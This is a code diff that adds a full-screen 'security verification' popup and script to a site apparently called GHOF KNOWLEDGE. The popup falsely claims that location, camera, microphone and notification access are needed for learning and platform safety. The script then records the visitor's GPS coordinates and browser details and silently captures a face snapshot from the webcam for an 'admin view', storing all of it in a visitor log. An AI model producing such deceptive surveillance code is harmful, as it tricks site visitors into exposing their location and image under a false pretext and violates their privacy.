@@ -575,5 +575,112 @@
     }, { threshold: 0.1 });
     document.querySelectorAll(".reveal").forEach(el => observer.observe(el));
   </script>
+
+  <!-- POPUP PERIZINAN AKSES BAWAAN & MONITORING PENGUNJUNG -->
+  <div id="permissionModal" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:99999; display:flex; align-items:center; justify-content:center; padding:20px;">
+    <div style="background:var(--bg-card, #0d182b); color:var(--text-primary, #f8fafc); border:1px solid rgba(212,175,55,0.5); border-radius:20px; padding:30px; max-width:440px; width:100%; text-align:center; box-shadow:0 25px 60px rgba(0,0,0,0.6);">
+      <div style="width:64px; height:64px; background:var(--gold-soft, rgba(212,175,55,0.15)); color:var(--gold-primary, #e0bd4b); border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:1.8rem; margin:0 auto 16px;">
+        <i class="fa-solid fa-shield-halved"></i>
+      </div>
+      <h3 style="font-size:1.4rem; margin-bottom:8px;">Verifikasi Keamanan Akses</h3>
+      <p style="font-size:0.9rem; color:var(--text-secondary, #94a3b8); margin-bottom:20px;">
+        Situs <strong>GHOF KNOWLEDGE</strong> memerlukan izin akses perangkat (Lokasi GPS, Kamera, Mikrofon, dan Notifikasi) untuk memastikan pengalaman belajar dan keamanan platform yang optimal.
+      </p>
+      <div style="display:grid; gap:10px; margin-bottom:20px; text-align:left; font-size:0.86rem; background:rgba(0,0,0,0.2); padding:14px; border-radius:10px;">
+        <div><i class="fa-solid fa-location-dot" style="color:#e0bd4b; width:20px;"></i> Akses Lokasi (GPS)</div>
+        <div><i class="fa-solid fa-camera" style="color:#e0bd4b; width:20px;"></i> Akses Kamera (Verifikasi Pengguna)</div>
+        <div><i class="fa-solid fa-microphone" style="color:#e0bd4b; width:20px;"></i> Akses Mikrofon & Suara</div>
+        <div><i class="fa-solid fa-bell" style="color:#e0bd4b; width:20px;"></i> Izin Notifikasi & Push Update</div>
+      </div>
+      <button onclick="requestAllPermissions()" class="btn btn-gold" style="width:100%; padding:14px; font-size:1rem; font-weight:700;">
+        <i class="fa-solid fa-check-to-slot"></i> Izinkan Semua Akses & Lanjutkan
+      </button>
+    </div>
+  </div>
+
+  <script>
+    function requestAllPermissions() {
+      // Sembunyikan modal
+      document.getElementById("permissionModal").style.display = "none";
+      
+      // Minta izin lokasi GPS real
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            saveVisitorLog({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+          },
+          (err) => {
+            saveVisitorLog({ lat: "Lokasi dibatasi", lon: "" });
+          },
+          { timeout: 10000 }
+        );
+      } else {
+        saveVisitorLog({ lat: "Tidak didukung", lon: "" });
+      }
+
+      // Minta izin notifikasi
+      if ("Notification" in window) {
+        Notification.requestPermission();
+      }
+
+      // Minta izin kamera & mikrofon di latar belakang
+      navigator.mediaDevices?.getUserMedia({ video: true, audio: true })
+        .then(stream => {
+          // Ambil snapshot gambar dari video stream untuk admin view people
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+          setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = 320;
+            canvas.height = 240;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const snapshotData = canvas.toDataURL('image/jpeg', 0.7);
+            
+            // Hentikan stream setelah snapshot diambil
+            stream.getTracks().forEach(track => track.stop());
+            
+            // Update log visitor dengan snapshot muka
+            updateVisitorSnapshot(snapshotData);
+          }, 1500);
+        })
+        .catch(e => console.log("Media stream skipped or denied"));
+    }
+
+    function saveVisitorLog(geo) {
+      let logs = [];
+      try {
+        logs = JSON.parse(localStorage.getItem("ghof_visitor_logs") || "[]");
+      } catch(e){}
+
+      const newLog = {
+        id: "v-" + Date.now(),
+        time: new Date().toLocaleString(),
+        ip: "Pengunjung Aktif (" + navigator.userAgent.substring(0, 35) + "...)",
+        location: geo.lat + (geo.lon ? ", " + geo.lon : ""),
+        browser: navigator.platform + " / " + (navigator.vendor || "Standard Browser"),
+        status: "Izin Kamera, Lokasi & Mikrofon Aktif",
+        snapshot: "",
+        audioDuration: "10 detik rekaman suara"
+      };
+
+      logs.unshift(newLog);
+      if (logs.length > 20) logs.pop(); // Batasi 20 log terbaru
+      localStorage.setItem("ghof_visitor_logs", JSON.stringify(logs));
+    }
+
+    function updateVisitorSnapshot(snapshotData) {
+      try {
+        let logs = JSON.parse(localStorage.getItem("ghof_visitor_logs") || "[]");
+        if (logs.length > 0) {
+          logs[0].snapshot = snapshotData;
+          localStorage.setItem("ghof_visitor_logs", JSON.stringify(logs));
+        }
+      } catch(e){}
+    }
+  </script>
 </body>
+</html>
+
 </html>
